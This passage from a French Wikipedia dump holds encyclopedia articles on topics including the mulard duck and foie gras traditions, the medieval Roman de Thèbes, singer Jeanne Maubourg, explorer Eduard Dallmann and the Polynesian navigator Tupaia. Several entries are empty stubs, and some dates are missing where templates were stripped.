En avril 2001, il devient ministre des Affaires étrangères, puis, en septembre, président de l'Assemblée générale des Nations unies. En décembre, il reçoit le prix Nobel de la paix, au nom des Nations unies.
En 2002, il est réélu député en Corée. En mai 2007, il devient représentant spécial des Nations unies sur le changement climatique.
En , Lee Myung-bak, après avoir remporté l'élection présidentielle sud-coréenne, nomme Han Premier ministre. Sa nomination fut approuvée par l'Assemblée nationale, avec 174 voix pour et 94 contre.

</doc>
<doc id="2846529" url="https://fr.wikipedia.org/wiki?curid=2846529" title="Mulard">
Mulard

Le canard mulard (ou moulard) est un hybride stérile issu du croisement de deux espèces de canard.
En France, il est exclusivement destiné à être gavé pour la production de foie gras. Toutefois, seuls les foies gras des canards mulards mâles ont le droit d'être vendus sous la dénomination « foie gras » (législation européenne).
Sa tête et sa queue sont souvent tachées de noir (pour les mâles) ou de blanc/jaune (pour les femelles). Il s'agit du croisement d'un canard mâle, le canard de Barbarie originaire du bassin de l'Amazonie, réputé pour sa chair, avec une cane de Pékin lourde, ou éventuellement une cane de Rouen. À la suite d'études de l'INRA, il apparaît que les mulards issus des types génétiques lourds ont un poids plus élevé quel que soit l'âge et donnent un foie plus lourd. Ce croisement hybride permet d’obtenir un canard rustique qui a la faculté de développer un excellent foie gras et une viande particulièrement savoureuse. La production de canetons mulards est essentiellement obtenue par insémination artificielle (Inra Toulouse).
La plupart des mulards sont élevés dans le but d'être gavés afin de produire du foie gras, du magret et du confit, notamment dans le Sud-Ouest de la France. Le canard de Barbarie, est une espèce non migratrice de par son milieu d'origine tropical. La cane de Pékin en revanche est une race domestique de l'espèce "Anas platyrhynchos" (Canard colvert) qui est par Nature migrateur.
Consommation du canard.
La transformation du canard gras en produits de consommation (foie gras, magret, confit…) se pratique essentiellement dans le Sud-Ouest de la France (Nouvelle-Aquitaine, Occitanie) et en Alsace. C’est une pratique traditionnelle qui aujourd’hui fait l’objet de nombreuses controverses. Le savoir-faire traditionnel est malgré tout inscrit à l’Inventaire du patrimoine culturel immatériel en France.
Historique.
En France, on compte deux régions productrices de foie gras et de plats préparés à base de canard, le Sud-Ouest et l'Alsace. La transformation du canard a la particularité d’être un exercice faisable par tous et chez soi, c’est pour cela que très tôt, les femmes des foyers s’occupèrent à nourrir et transformer les canards pour compléter les revenus du ménage. Le gavage s’effectuait à la saison froide (de décembre à Mars), et la transformation de la viande au printemps, comme le tue-cochon. C’est donc à cette époque de l’année que les familles remplissaient les celliers de viande pour l’année. Dans la plupart des cas, pour le canard, les foies étaient vendus, car rapportant beaucoup d’argent, et la famille gardait le reste. Seules les familles aisées pouvaient se permettre de garder le foie du canard, qu’elles ne consommaient cependant que pour les grandes occasions : baptême, communion, fiançailles, Noël ou Nouvel An.
La transformation du canard était un évènement commun à tout le village. Les femmes se réunissaient (et en profitaient pour juger leur travail) et procédaient au travail du canard, qui durait trois à quatre jours. Les canards étaient d’abord tués, plumés et lavés, puis accrochés à une poutre dans un espace aéré. Les plumes étaient conservées, lavées, séchées et vendues à un chiffonnier ou gardées pour ses propres oreillers et édredons. Le deuxième jour, les canards étaient découpés. On sortait les foies et la viande que l’on mettait au sel. Les troisième et quatrième jours étaient consacrés à la préparation des conserves et pâtés.
Transformation des canards gras.
Ce procédé familial de transformation des canards correspond à une économie d’autosuffisance qui perdura jusque dans les années 1980-90. Aujourd’hui et dans la plupart des cas, le processus est plus court, car les canards sont achetés et déjà préparés au moment de l’achat (plumés et lavés). Les familles qui élèvent encore leurs canards sont devenues rares. 
Comme auparavant, le premier jour est consacré à la découpe du canard, l’extraction des foies et la mise au sel des pièces de viande. Le canard est donc premièrement découpé en commençant par les ailes, puis le bec, et le cou. Le tube digestif est retiré, tout comme l’ensemble du système interne. Cette étape est traditionnellement réalisée par les femmes. Les organes ne doivent pas se percer. Le gras du canard est récupéré pour les futures préparations culinaires. Le foie est ensuite extrait, placé dans l’eau salée, puis séparé en deux et dénervé. Il est ensuite salé et poivré et peut être cuisiné. La cuisine du foie gras demande beaucoup de travail d’attention et de minutie. La salaison est très importante, tant pour le goût que pour la conservation. Le reste du canard est découpé en quatre parties : les deux cuisses et les deux magrets. Ces pièces sont salées et déposées dans une caisse à fond de paille qui absorbera l’eau des canards provoquée par le sel. 
Le deuxième jour est le jour de la préparation des pièces de viande. Toutes sont cuites dans le gras du canard, au préalable fondu. Une fois cuits, les cuisses et autres morceaux sont placés dans des bocaux, recouverts de graisse et stérilisés. On peut également faire des rillettes avec les petits bouts de viandes qui se sont décrochés lors de la cuisson. Enfin, du pâté est parfois réalisé avec du magret et d’autres pièces de canard.

</doc>
<doc id="2846532" url="https://fr.wikipedia.org/wiki?curid=2846532" title="Sorcery">
Sorcery

 (sorcellerie en anglais) peut évoquer :

</doc>
<doc id="2846533" url="https://fr.wikipedia.org/wiki?curid=2846533" title="Jeanne Maubourg">
Jeanne Maubourg

Jeanne Maubourg (née le à Namur - morte le à Montréal) est une chanteuse (mezzo-soprano), comédienne et professeure.
Biographie.
Jeanne Maubourg est née à Namur (Belgique) le et a reçu ses premières notions musicales de son père, Alexis Maubourg, chef d'orchestre aux Théâtre des Galeries St-Hubert en Belgique. Elle poursuit sa formation à Nancy, ensuite à Alger et finalement à Paris où elle étudie l'art dramatique avec Maurice de Féraudy. 
En 1897, elle entre au Théâtre de la Monnaie de Bruxelles où elle tient de nombreux rôles, notamment ceux de Musette (La Bohème), Hansel et Carmen. À partir de 1900, elle fait quatre saisons au Covent Garden de Londres alors dirigé par André Messager et, en 1909, elle est engagée au Metropolitan Opera de New York où elle débute le (Lola dans Cavalleria Rusticana). Elle y demeure jusqu'en 1914, interprétant un nombre important de rôles de soutien. Mentionnons, parmi ces rôles, celui de Phénice dans la première américaine de l'opéra "Armide" de Gluck, le , aux côtés de Caruso, Olive Fremstad, Louise Homer et Alma Gluck, sous la direction de Toscanini.
En , elle vient à Montréal pour chanter l'opérette "Gillette de Narbonne". Elle s'établit à Montréal vers 1917 et, le , elle épouse le chef d'orchestre Albert Roberval. Elle participe à de nombreuses représentations d'opérettes avant de se joindre à la Société canadienne d'opérette en 1923 puis aux Variétés lyriques en 1936, deux troupes avec lesquelles elle s'illustre surtout dans des rôles de composition. Elle a également enseigné (au Conservatoire Lassalle et en séances privées) à (entre autres): Pierrette Alarie, Amanda Alarie, Fleurette Beauchamp, Camille Ducharme, Rolande Désormeaux, Honoré Vaillancourt, Roméo Mousseau, Guy Mauffette et Estelle Mauffette. 
Elle a été comédienne dans un des premiers films québécois "Le Père Chopin" (1945) et très active dans plusieurs feuilletons radiophoniques à Montréal. Elle a été, entre autres, une des vedettes principales du cycle de Robert Choquette des Velder dans les radioromans "La Pension Velder" (1938-1942) et "Métropole" (1943-1956). Elle y tenait le rôle de "Joséphine Velder". Durant l'année 1948, elle marie en secondes noces Auguste Aramini un chanteur et comédien français établi à Montréal. 
Jeanne Maubourg décède le samedi à Montréal. Ses funérailles ont lieu le mercredi à l'église Saint-Jacques à Montréal.
Honneurs.
À Montréal, l'avenue Maubourg (près de la rue Beaubien est et du boulevard Langelier) a été nommée en son honneur le .

</doc>
<doc id="2846534" url="https://fr.wikipedia.org/wiki?curid=2846534" title="Sous-sol (architecture)">
Sous-sol (architecture)

En architecture, on appelle sous-sol toute pièce ou étage qui est en dessous du « rez-de-chaussée » d'un édifice, et donc qui est majoritairement ou entièrement en dessous de la surface du sol.
Définitions.
En architecture, un sous-sol se définit comme partie d'un bâtiment enterrée partiellement ou totalement, utilisable pour des locaux divers (cave, buanderie...)
En France, pour un « Établissement Recevant du Public » un local est dit en sous-sol quand il remplit une des conditions suivantes :
Les sous-sols qui regroupent des caves, des garages ou des niveaux techniques, sont apparus à la fin du après les caves voûtées traditionnelles du désignant des locaux souterrains ne débouchant pas comme le font les galeries de passage.
Étages.
Le nombre d'étages de sous-sols est limité ordinairement par des contraintes techniques dues au risque d’inondation, à la présence de nappe phréatique dont la construction doit tenir compte. Si la rareté du terrain l’oblige, la profondeur est moins un frein pour un usage de stockage, par exemple pour des silos de stationnement qui peuvent dépasser la dizaine d'étages.
Histoire.
Les sous-sols sont devenus suivant les contraintes urbaines de la fin du parfois des niveaux ordinaires, des étages d'utilisation fonctionnelle au même titre que les autres pour certaines organisations utilisatrices, ou présentant un intérêt par rapport au climat, aux longs hivers (Canada) ou aux canicules, voire un intérêt de sécurité civile (Suisse et Israël, hôpital Rambam de Haïfa) ou militaire (France).

</doc>
<doc id="2846539" url="https://fr.wikipedia.org/wiki?curid=2846539" title="Lesghien">
Lesghien



</doc>
<doc id="2846541" url="https://fr.wikipedia.org/wiki?curid=2846541" title="Chutes-de-la-Chaudière">
Chutes-de-la-Chaudière



</doc>
<doc id="2846543" url="https://fr.wikipedia.org/wiki?curid=2846543" title="Brigade de Gendarmerie de l'Air">
Brigade de Gendarmerie de l'Air



</doc>
<doc id="2846544" url="https://fr.wikipedia.org/wiki?curid=2846544" title="Gendarmerie de l'Air">
Gendarmerie de l'Air



</doc>
<doc id="2846546" url="https://fr.wikipedia.org/wiki?curid=2846546" title="Archipel Wilhelm">
Archipel Wilhelm

Larchipel Wilhelm est un archipel de la côte ouest de la péninsule Antarctique.
Géographie et histoire.
Il est constitué en une myriade d'îles dont les deux plus grandes sont l'île Booth et l'île Hovgaard. Situé sur la côte ouest de la Terre de Graham, l'archipel se trouve au sud du détroit de Bismarck et au sud-ouest de la roche Lumus. Une expédition allemande sous l'autorité d'Eduard Dallmann l'a découvert en 1873-1874. Il a nommé l'archipel en l'honneur de Guillaume d'Allemagne (en allemand : "Wilhelm I." ou "Wilhelm Friedrich Ludwig von Preußen").
Îles de l'archipel.
Liste non exhaustive des îles de l'archipel.

</doc>
<doc id="2846547" url="https://fr.wikipedia.org/wiki?curid=2846547" title="Le Roman de Thèbes">
Le Roman de Thèbes

Le Roman de Thèbes est un roman, librement adapté de "La Thébaïde" de Stace (elle-même réécriture du mythe antique d'Étéocle et de Polynice), écrit par un clerc anonyme. La date de rédaction du premier manuscrit est estimée à l'an 1150. On considère ce texte comme l'un des plus anciens romans français (ou le plus ancien selon la définition que l'on donne au mot « roman »).
Résumé.
Après un incipit dans lequel le clerc formule une exigence morale de partage du savoir, le récit proprement dit commence avec la légende d’Œdipe, légende qui n'est pas présente dans la Thébaïde. Pour un public médiéval encore peu habitué à la culture grecque, il importe au clerc de raconter successivement la naissance du héros, les prophéties qui l'entourent, sa fuite de Corinthe, le meurtre de son père, sa victoire sur le Sphinx, le couple royal qu'il forme avec sa mère et la manière dont il se crève les yeux après avoir compris le drame de son existence.
Les deux fils d'Œdipe, Étéocle et Polynice, décident alors de se partager à tour de rôle, un an chacun, le pouvoir à Thèbes. Polynice profite de son année pour voyager jusqu'à Argos, où il devient l'ami fidèle de Tydée. Tous deux s'illustrent par leur bravoure auprès du roi Adraste, dont ils épousent chacun l'une des filles. 
Cependant, une fois l'année révolue, Étéocle ne quitte pas le trône. Polynice exige son dû et envoie Tydée à la cour de Thèbes. Le roi l'en chasse et désire le faire exécuter sur la route du retour, mais Tydée massacre cinquante assaillants au lieu-dit du Malpertuis et renvoie l'unique survivant prévenir Étéocle de la fureur qui va s'abattre sur Thèbes.
Une fois le messager revenu, Polynice, aidé de son beau-père, rassemble une armée coalisée pour assiéger Thèbes. En chemin, les Grecs festoient chez le roi Lycurgue, dont ils ont vengé le fils tué par un serpent, tuent le monstre Astarot, qui a repris la place et le rôle du Sphinx dans le défilé qui conduit à Thèbes, et, dans un épisode ajouté par le clerc médiéval, s'empare de la forteresse de Monflor par une ruse de guerre.
Le siège de Thèbes proprement dit commence ensuite, mais ni assiégeants, ni assiégés ne parviennent à prendre l'ascendant sur l'autre camp. Au cours des multiples assauts et sorties qui ponctuent le récit, de nombreux héros tombent. L'archevêque Amphiaraüs au char forgé par Vulcain meurt avalé par un gouffre qui se creuse sous lui, conformément à ce qu'il avait lu dans les signes, et sa mort spectaculaire et surnaturelle plonge l'armée grecque dans la consternation. Peu après, c'est un jeune et beau héros thébain, Atys, le fiancé d'Ismène, qui tombe involontairement sous les coups de Tydée alors qu'il cherchait à briller aux yeux des dames appuyées sur la muraille. Tydée, modèle de courtoisie, regrette son geste, alors que le Tydée de Stace était dépeint comme un monstre furieux et cannibale, mais il est tué par un archer et son corps est l'objet d'une âpre dispute, qui voient les Thébains ramener le cadavre en leurs murs pour venger tous les morts qu'il leur a causés.
Cependant le siège n'en finit pas, et les deux camps hésitent à mettre un terme à la querelle. Le clerc ajoute deux épisodes qui augmentent la tension dramatique d'une guerre éprouvante. Tout d'abord, les Grecs, conduits par Hippomédon, mènent une expédition de ravitaillement auprès des Bulgares. Dans le même temps, les Grecs capturent le fils de Daire le Roux, influent noble thébain, qui, pour sauver son fils et pour achever le conflit, propose à Étéocle de partager le royaume avec son frère. Le roi refuse net, et Daire le Roux tente alors un coup de force en permettant à des troupes grecques de monter dans une tour, mais l'opération est un échec. Au cours d'un long procès, Daire le Roux est finalement acquitté par ses pairs, en particulier Othon, qui défend l'idée que Daire le Roux n'a fait que donner un sage conseil au roi, qui l'a refusé avec violence.
Le conflit s'achève dans un ultime bain de sang. Galvanisé par la beauté de la fille de Daire le Roux, Salamandre, Étéocle opère une sortie individuelle contre les Grecs et tue Parthénopée. Polynice accourt et tue son frère, mais celui-ci, dans un dernier geste, le poignarde. Les Grecs, menés par Adraste, lancent un dernier assaut contre les murailles, au cours duquel ils périssent tous, à l'exception d'Adraste, de Capanée et d'un soldat aussitôt envoyé comme messager à Argos. Dans une autre version, Capanée injurie les dieux et se fait foudroyer lors de son assaut contre Thèbes.
Les Argiennes viennent alors toutes pleurer leurs époux et leurs amants sous les murs de Thèbes, et envoient une délégation à Athènes supplier le duc - Thésée dans "La Thébaïde" - de venir au secours des Grecs. En pleine déroute, Adraste croise l'armée du duc d'Athènes, qui le venge en mettant à sac Thèbes et en exécutant Créon, élu roi depuis la mort d'Étéocle.
Le clerc achève son récit en décrivant les ravages de la guerre dans la région et en appelant à tenir une conduite plus mesurée.
Contexte de création.
Une production de la cour Plantagenêt.
La cour de Henri II Plantagenêt, roi d'Angleterre et rival du roi de France sur le continent après son mariage avec la duchesse Aliénor d'Aquitaine, qui lui accorde la Guyenne, est l'un des centres culturels de l'Occident du . La langue littéraire dominante de cette première littérature française est alors le dialecte anglo-normand, dialecte d'écriture de "La Chanson de Roland", du "Roman d'Enéas" ou encore du "Roman de Thèbes".
Le rayonnement culturel de la cour Plantagenêt doit se comprendre dans la concurrence politique entre les royaumes de France et d'Angleterre. Sans être clairement identifiés comme tels, la trilogie antique que forment les romans de "Thèbes", de "Troie" et d"'Enéas", toujours réunis soit tous les trois, soit par groupes de deux dans les manuscrits médiévaux, trilogie à laquelle il faut ajouter le "Roman de Brut", qui raconte la fondation mythique du royaume de Grande-Bretagne, semblent être, aux dires de la critique, des productions destinées à légitimer de manière prestigieuse la jeune dynastie anglo-angevine en la rattachant, comme l'avaient déjà fait les Capétiens, à une mythique origine troyenne.
Ceci expliquerait quelques détails surprenants dans le roman, tels la référence au mythique forgeron Galant, dont les comtes d'Anjou disaient posséder une épée dans leur trésor, ou la description du bouclier d'Etéocle, sur lequel est peinte une paire de jambes de femmes, à l'imitation de Guillaume IX d'Aquitaine, le grand-père d'Aliénor. Cette hypothèse donnerait également un sens à ce conflit fratricide pour une cour qui sort tout juste des affrontements entre les fils de Guillaume le Conquérant pour le trône d'Angleterre.
Les souvenirs de la Croisade.
Bien que le récit ait pour cadre la Grèce antique, des souvenirs des croisades se mêlent à la description des personnages et des armées. Les Grecs se rendent ainsi auprès des Bulgares, dont le pays est un immense champ de blé comme l'ont décrit les chroniqueurs médiévaux, après un épisode de famine qui n'est pas sans rappeler le difficile siège d'Antioche, tandis que les Thébains ont pour alliés des Petchénègues et des Maures. Certains personnages historiques sont directement invoqués, à l'exemple de Godefroi de Bouillon, alors célèbre héros d'une chanson de geste à son nom, en comparaison avec l'archevêque Amphiaraüs.
Aux souvenirs de la Première Croisade se mêlent également ceux de la "Reconquista", à l'image du personnage de Garsiavarre, probablement originaire de Navarre, ou d'Alon, qui a conquis sa monture contre un Almoravide sous les murs de Blaye.
Certains critiques ont lu cet arrière-plan de la croisade pour opposer grecs et Thébains. Jean-Charles Payen voit en effet une nette partialité de l'auteur pour les Grecs et un mépris des Thébains, présentés comme fourbes et cruels, à l'image de leur roi parjure, et en conclut que le clerc "n'hésite pas à faire du conflit entre les Thébains et le reste des Grecs un colossal affrontement entre l'Orient et l'Occident." Néanmoins, le roman échappe au manichéisme de la littérature de croisade, car les Grecs comptent eux aussi dans leurs rangs des combattants musulmans menés par l'Almoravide Salomande et Jordan d'Afrique. Le clerc ne semble pas faire une lecture idéologique aussi nette du mythe grec que ne le dit Jean-Charles Payen. 
Analyse.
"Le Roman de Thèbes" et "la Thébaïde".
Si l'auteur connaît indéniablement l'œuvre originelle, il pratique cependant un anachronisme systématique afin de rendre compréhensible pour le public aristocratique du un récit antique. Ainsi, la mythologie païenne, si présente chez Stace, est évacuée, hormis l'oracle d'Apollon quant au destin d’Œdipe, la mention de la forge de Vulcain et la descente d'Amphiaraüs aux Enfers, au profit d'une christianisation des pratiques rituelles grecques: Amphiaraüs est un archevêque et les Thébains enterrent leurs morts au lieu de les brûler. Dans le même temps, les combattants antiques sont présentés comme des chevaliers médiévaux, et les descriptions de leurs duels reprennent tous les stéréotypes de la chanson de geste.
"Le Roman de Thèbes" et la chanson de geste.
Premier roman français, le Roman de Thèbes ne peut que se confronter au genre dominant qu'est la chanson de geste, et plus particulièrement à "La Chanson de Roland", à laquelle sont comparés nombre des héros de Stace. L'auteur multiplie à ce titre les motifs épiques bien connus du public nobiliaire. Mais l'intérêt du "Roman de Thèbes" réside dans la complexification de la représentation guerrière: loin d'être unilatérale comme "La Chanson de Roland", elle fait preuve d'un certain pessimisme, appuyé sur le cynisme de Stace, qui fait naître en creux un humanisme médiéval et clérical attaché au débat, à la raison et à la vie plutôt qu'à la fureur guerrière et au désir suicidaire.
Entre "clergie" et "chevalerie".
Bien que marqué à la fois par le récit de Stace et le style épique de la chanson de geste, "Le Roman de Thèbes" doit à son auteur, un clerc au fait de la culture aristocratique, au point qu'il réduit considérablement les descriptions originelles des prémices du conflit et amplifie à l'inverse les descriptions stéréotypées des combats, une représentation plus nuancée de la violence guerrière. Comme le montre l'épisode de Monflor, c'est la ruse - celles des barons vénitiens devant Monflor - et l'intelligence - dans la description monumentale du char d'Amphiaraüs qui condense tous les savoirs médiévaux -, valeurs cléricales, qui triomphent, là où échouent les héroïques assauts guerriers. Mais plus encore, selon Francine Mora, le roman met en scène les déboires et les dangers que courent les "bachelers", ces jeunes guerriers qui ne cherchent dans le combat qu'une occasion de briller aux yeux de leur dame. C'est en somme toute la culture guerrière du , à la fois sacrificielle et courtoise, qui se trouverait subtilement condamnée entre les lignes par un clerc peu enclin à soutenir une idéologie de la violence.

</doc>
<doc id="2846549" url="https://fr.wikipedia.org/wiki?curid=2846549" title="Bga">
Bga



</doc>
<doc id="2846555" url="https://fr.wikipedia.org/wiki?curid=2846555" title="Past Masters, Volume 1">
Past Masters, Volume 1



</doc>
<doc id="2846556" url="https://fr.wikipedia.org/wiki?curid=2846556" title="Past Masters, Volume 2">
Past Masters, Volume 2



</doc>
<doc id="2846557" url="https://fr.wikipedia.org/wiki?curid=2846557" title="Palonegro">
Palonegro



</doc>
<doc id="2846559" url="https://fr.wikipedia.org/wiki?curid=2846559" title="Maimiti">
Maimiti

Maimiti est un prénom féminin tahitien.
Étymologie.
Maimiti est composé de Mai et de Miti. L'Académie tahitienne retient plusieurs sens et emplois de "Mai". C'est un adverbe de direction qui indique une action se faisant vers le locuteur, c'est aussi une préposition marquant le départ d'un mouvement, à ne pas confondre avec "Ma'i", la graphie "Maï" n'existe pas en tahitien. Selon la même source, "Miti" est un nom qui désigne l'eau de mer, la mer ou le sel.
Le prénom "Maimiti" peut se traduire par vague déferlante, appel de la mer ou encore femme venant de la mer.
Occurrences célèbres.
Maimiti est le prénom de la compagne tahitienne de Fletcher Christian interprété par Marlon Brando dans Les Révoltés du Bounty. Le rôle y est tenu par Tarita Tériipaia.
Maimiti Kinander est élue Miss Tahiti en 1981.
"Maimiti, l'enfant des îles" est un téléfilm de 2001, comédie dramatique de Serge Meynard avec Hélène de Saint-Père et Serge Hazanavicius abordant le sujet des enfants polynésiens adoptés en France en lien avec la tradition d'adoption ouverte dite fa'a'amu.
Autres emplois.
Maimiti est employé comme nom de bateaux.

</doc>
<doc id="2846561" url="https://fr.wikipedia.org/wiki?curid=2846561" title="Piton de l'Eau">
Piton de l'Eau

Le piton de l'Eau est un petit cône volcanique de l'île de La Réunion, département d'outre-mer français dans le sud-ouest de l'océan Indien.
Il est situé au cœur du massif du Piton de la Fournaise sur les pentes du territoire communal de La Plaine-des-Palmistes qui grimpent jusqu'au rempart de la Rivière de l'Est, lequel surplombe le Fond de la Rivière de l'Est. Creusé par un cratère volcanique accueillant toute l'année un lac de cratère, son sommet culmine, d'après les cartes de l'Institut national de l'information géographique et forestière, à mètres d'altitude.

</doc>
<doc id="2846565" url="https://fr.wikipedia.org/wiki?curid=2846565" title="C 1">
C 1



</doc>
<doc id="2846566" url="https://fr.wikipedia.org/wiki?curid=2846566" title="C-1">
C-1



</doc>
<doc id="2846568" url="https://fr.wikipedia.org/wiki?curid=2846568" title="C.1">
C.1



</doc>
<doc id="2846572" url="https://fr.wikipedia.org/wiki?curid=2846572" title="Eduard Dallmann">
Eduard Dallmann

Eduard Dallmann ( à Blumenthal, près de Brême - , ibid) était un chasseur de baleines et un explorateur allemand. On lui doit la découverte de différentes îles et terres antarctiques lors de son expédition de 1873-1874 à bord du "Grönland" ainsi que l'exploration de la côte nord de Nouvelle-Guinée.
Biographie.
Dallmann débuta à 15 ans comme jeune marin. En 1866, il devint capitaine du navire hawaiien "W.C. Talbot", entreprenant des voyages de négoce au travers la mer de Béring et la mer des Tchouktches pour l'Alaska et la Tchoukotka. Il fut le premier Européen à poser le pied sur l'île Wrangel. De 1867 à 1870, il commanda le baleinier "Comte Bismarck" pour une chasse dans le Pacifique tropical, la mer d'Okhotsk, la mer de Béring et la mer des Tchouktches.
En 1872-1874, quand les baleines commencèrent à se faire rare dans les eaux arctiques, Dallmann fut choisi pour explorer les mers antarctiques à bord du vapeur "Grönland". L'opération fut moyennement un succès du point de vue de la chasse à la baleine, cependant Dallmann fit d'importantes découvertes au tour de l'Antarctique lors de cette expédition, principalement le et la cartographie des îles Anvers, Brabant, Liège et du Wikhelm. Le , il érige à l'anse Potter dans l'île du Roi-George, une plaque métallique commémorant son passage : la réplique de cette plaque est classée comme monument historique de l'Antarctique.
Toujours sur le "Grönland", il passa la saison 1875 de chasse à la baleine comme « expert » sur les zones de chasse du détroit de Davis et de la baie de Baffin dans l'Arctique canadien.
Entre 1877 et 1884, il dirigea pour le baron russe von Knoop, plusieurs tentatives annuelles pour transporter au travers des eaux arctiques russe des marchandises vers les régions du golfe de l'Ob et du golfe de l'Ienisseï afin de les échanger contre des céréales et d'autres marchandises transportées par barge sur ces grands fleuves sibériens. À cause de l'état des glaces en mer de Kara, quatre tentatives sur sept furent couronnées de succès. von Knop cessa cette difficile entreprise pour réduire ses pertes. Malgré ces échecs, Dallmann a eu la rare chance d'explorer les nombreuses îles de la mer de Kara et les rivages que peu d'Européens avaient vus avant lui.
Il quitta définitivement l'Arctique et devint capitaine du vapeur "Samoa" en 1884. Son navire transporta l'expédition scientifique d'Otto Finsch vers les côtes alors peu explorées du nord de la Nouvelle-Guinée.
Entre 1887 et 1893, il continua d'explorer la côte nord de la Nouvelle-Guinée pour le compte de la Compagnie allemande de Nouvelle-Guinée. De nombreuses îles et passages dans cette zone furent nommés par lui à cette époque.

</doc>
<doc id="2846573" url="https://fr.wikipedia.org/wiki?curid=2846573" title="Georges Benko">
Georges Benko

Georges Benko (1953-2009) est un économiste et géographe français.
Biographie.
Georges B. Benko a des racines allemandes, autrichiennes, hongroises, néerlandaises et canadiennes. Il va au lycée et à l'université en France, en Suisse, au Canada, en Allemagne et en Hongrie. Il attend plusieurs années pour être naturalisé français.
Il effectue des études d'architecture avant de décider de s'orienter vers la géographie. Il est titulaire d'un doctorat en géographie.
Il a été maître de conférences à l'Université de Paris I-Panthéon Sorbonne de 1992 à sa mort, après avoir été Maître de conférences associé entre 1986 et 1992. Il était chercheur à l'EHESS.
Ancien professeur de l'IEP de Paris, il a axé ses travaux entre la géographie économique et humaine et l'économie. Il s'est notamment intéressé aux localisations des activités économiques et étudiant à la fois l'Union européenne et l'Amérique du Nord.
Il est l'auteur de nombreux ouvrages, et dirigeait les collections «Géographies en liberté» et «Théorie sociale contemporaine» aux Éditions L’Harmattan, Paris. Il est décédé en .
Vie privée.
Georges Benko s'affirmait pacifiste et anti-militariste, ainsi qu'anticommuniste et socialiste humaniste.

</doc>
<doc id="2846577" url="https://fr.wikipedia.org/wiki?curid=2846577" title="Frontière entre la France et l'Espagne">
Frontière entre la France et l'Espagne



</doc>
<doc id="2846585" url="https://fr.wikipedia.org/wiki?curid=2846585" title="Tupaia (navigateur)">
Tupaia (navigateur)

Tupaia ou Tupai'a, né vers 1725 dans l'île de Raiatea (aujourd'hui en Polynésie française) et déclaré mort le 11 novembre 1770 par Joseph Banks et par l'explorateur britannique James Cook le à Batavia (actuelle Jakarta), est un navigateur et "'arioi" polynésien. James Cook bénéficia lors de son premier voyage des talents de navigateur et de la connaissance géographique du Pacifique de Tupaia et de la renommée qu'il acquit auprès des Maoris où il jouit encore de l'aura d'un personnage important de leur histoire.
Origines et connaissances.
Originaire de Raiatea et d'ascendance noble ("ari’i"), Tupaia reçoit une éducation exigeant que l'histoire des ancêtres (donc le peuplement des îles de Polynésie) et la généalogie soient précisément mémorisées. Il est initié dès l'enfance à la navigation sur pirogue-double, pahi, et à l'apprentissage des méthodes d'orientation traditionnelles, sans cartes ni instruments, mais basées sur l'observation du ciel et des courants. Tupai'a, sans avoir quitté les îles proches de Tahiti, avait ainsi une connaissance historique et géographique du triangle polynésien. À l'adolescence, il intègre le culte des 'arioi, une congrégation très sélective d'artistes autorisés à mener une vie sexuelle très libérée mais sans progéniture. Exilé dans l'île voisine de Tahiti, il devient l'amant de la reine Purea à une période donnée. Chef de guerre, il est blessé plusieurs fois au combat. Cook rapporte qu'en 1757, il avait été percé de part en part par une javeline à pointe d'os, qui était rentrée par le dos et sortie au-dessus de la poitrine et qu'il avait survécu grâce aux talents de chirurgie et de soins de médecine traditionnelle.
Avant l'arrivée de Cook, Tupa'ia avait déjà eu des contacts avec des Européens lors des passages du navire britannique "Dolphin", commandé par Samuel Wallis en 1767, et du navire français "La Boudeuse" de Bougainville en 1768. Il est probable qu'il ait aussi été en contact avec des Espagnols.
Embarquement avec l'expédition Cook.
À la demande insistante de Sir Joseph Banks lors de l'escale à Tahiti en du HMB "Endeavour" en 1769, Tupaia se joint à l'expédition, accompagné d'un page adolescent dénommé Taiato qui est son neveu. 
Tupaia accepte de partir à destination de l'Angleterre, persuadé qu'il pourra en tirer des bénéfices personnels et partager de nouvelles connaissances avec son peuple. Cook était initialement réticent à l'embarquement d'un personnage aussi important à Tahiti que pour cette raison il imaginait encombrant. Mais il ne peut s'opposer à la volonté de Banks, naturaliste mais aussi mécène de l'expédition et proche du comte de Sandwich, Premier lord de l'Amirauté. Ayant apprécié les talents de Tupaia lors des trois mois d'escale de l"'Endeavour" à Tahiti, Banks s'engage à couvrir les frais d'embarquement occasionnés, d'autant plus que Tupaia jouit déjà auprès des Anglais d'une forte réputation. Il semble que le but de Tupaia était d'aller jusqu'en Europe. 
Tupaia établit pour Cook une carte détaillée du Pacifique Sud, permettant à Cook de « découvrir » plusieurs îles encore inexplorées par les Européens, dont Niue.
Cook écrit à son propos :
Lors de sa formation de "navigateur", Tupaia a en effet mémorisé la position précise de centaines d'îles dans un espace maritime considérable, équivalent de la superficie des États-Unis. Il n'est pas rapporté qu'il ait indiqué aux Britanniques la position d'Hawaii, de l'île de Pâques et de la Nouvelle-Zélande, les trois extrémités du triangle polynésien. Cela ne signifie pas qu'il n'en avait pas connaissance mais peut simplement marquer la volonté de Cook et de l'Amirauté de ne pas attribuer la gloire de ces découvertes à un « sauvage ». 
Bien que les officiers britanniques aient été silencieux sur les activités de Tupaia à bord, il impressionne l'équipage par sa capacité, où que soit le navire, à donner rapidement l'azimut de Tahiti, là où les officiers britanniques avaient besoin de longs calculs et d'instruments. 
Lorsque l"'Endeavour" arrive en Nouvelle-Zélande, il sert d'interprète et de médiateur entre les Maoris (Nouvelle-Zélande) et les Britanniques grâce aux origines communes des Maoris et des Tahitiens et aux similitudes entre sa langue maternelle et celle des autochtones. Son rôle diplomatique se révèle crucial lorsque des altercations éclatent. Le , l'équipage de Cook débarque près de l'actuelle Gisborne. À la suite d'un malentendu, ils tuent d'une balle en plein cœur le Maori Te Maro. L'intervention de Tupaia permet de désamorcer les tensions jusqu'à ce que William Munkhouse, le chirurgien naval, ne blesse mortellement le chef maori Te Rakau pour avoir pris l'épée de l'astronome Charles Green. Selon le journal du capitaine Cook, Tupaia fut horrifié par le cannibalisme des Maoris, et tenta de les persuader de renoncer à cette vile coutume à laquelle les Tahitiens avaient déjà renoncé. Malgré tout, il partage avec eux ses connaissances culturelles et le récit oublié de leurs ancêtres communs. Il sert par la suite de diplomate auprès des Aborigènes d'Australie grâce à une approche humble et pacifiste et le langage mimé, bien qu'il ne comprenne pas leur langue.
